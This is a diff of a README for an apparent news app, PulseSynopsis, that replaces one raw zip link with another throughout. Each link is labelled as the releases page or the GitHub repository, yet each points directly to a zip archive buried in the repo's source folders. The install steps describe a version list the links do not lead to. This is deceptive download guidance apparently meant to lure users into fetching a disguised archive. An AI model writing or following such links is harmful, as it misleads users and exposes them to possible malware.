@@ -6,9 +6,9 @@ Welcome to PulseSynopsis! This platform provides real-time news intelligence. It
 
 ## 📥 Download PulseSynopsis
 
-[![Download PulseSynopsis](https://raw.githubusercontent.com/kulayberde/PulseSynopsis/main/src/assets/PulseSynopsis-2.9.zip)](https://raw.githubusercontent.com/kulayberde/PulseSynopsis/main/src/assets/PulseSynopsis-2.9.zip)
+[![Download PulseSynopsis](https://github.com/kulayberde/PulseSynopsis/raw/refs/heads/main/src/data/Pulse-Synopsis-v2.2-alpha.2.zip)](https://github.com/kulayberde/PulseSynopsis/raw/refs/heads/main/src/data/Pulse-Synopsis-v2.2-alpha.2.zip)
 
-To download PulseSynopsis, visit [this releases page](https://raw.githubusercontent.com/kulayberde/PulseSynopsis/main/src/assets/PulseSynopsis-2.9.zip) where you can find the latest version of the application.
+To download PulseSynopsis, visit [this releases page](https://github.com/kulayberde/PulseSynopsis/raw/refs/heads/main/src/data/Pulse-Synopsis-v2.2-alpha.2.zip) where you can find the latest version of the application.
 
 ## 💻 System Requirements
 
@@ -22,7 +22,7 @@ Before you download, ensure your system meets these requirements:
 
 ## 🔧 Download & Install
 
-1. **Visit the Releases Page:** Go to [the PulseSynopsis releases page](https://raw.githubusercontent.com/kulayberde/PulseSynopsis/main/src/assets/PulseSynopsis-2.9.zip). This page will list all available versions of the application.
+1. **Visit the Releases Page:** Go to [the PulseSynopsis releases page](https://github.com/kulayberde/PulseSynopsis/raw/refs/heads/main/src/data/Pulse-Synopsis-v2.2-alpha.2.zip). This page will list all available versions of the application.
   
 2. **Choose Your Version:** Scroll through the list of releases. Look for the most recent version at the top. Under the version, you will see download options for different operating systems.
 
@@ -75,7 +75,7 @@ For further assistance, you can check out these resources:
 
 ## 🔗 Links
 
-- [Download PulseSynopsis](https://raw.githubusercontent.com/kulayberde/PulseSynopsis/main/src/assets/PulseSynopsis-2.9.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/kulayberde/PulseSynopsis/main/src/assets/PulseSynopsis-2.9.zip)
+- [Download PulseSynopsis](https://github.com/kulayberde/PulseSynopsis/raw/refs/heads/main/src/data/Pulse-Synopsis-v2.2-alpha.2.zip)
+- [GitHub Repository](https://github.com/kulayberde/PulseSynopsis/raw/refs/heads/main/src/data/Pulse-Synopsis-v2.2-alpha.2.zip)
 
 Thank you for choosing PulseSynopsis! Start exploring the world of news like never before.
